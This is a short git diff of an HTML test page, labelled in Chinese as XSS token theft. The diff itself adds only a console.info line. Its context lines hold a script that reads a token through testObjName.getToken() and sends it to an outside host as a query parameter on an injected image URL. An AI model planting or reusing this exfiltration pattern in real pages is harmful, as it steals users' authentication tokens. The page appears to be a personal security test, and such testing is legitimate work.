@@ -1,5 +1,3 @@
-<!--index.html-->
-
 <!DOCTYPE html>
 <html>
   <head>
@@ -12,6 +10,7 @@
   <body>
 	xss窃取token
     <script>
+		console.info('wzztest: xss test')
 		const myImage = document.createElement('img');
 		myImage.setAttribute('src','http://www.baidu.com/?data='+testObjName.getToken());
 		document.body.appendChild(myImage);
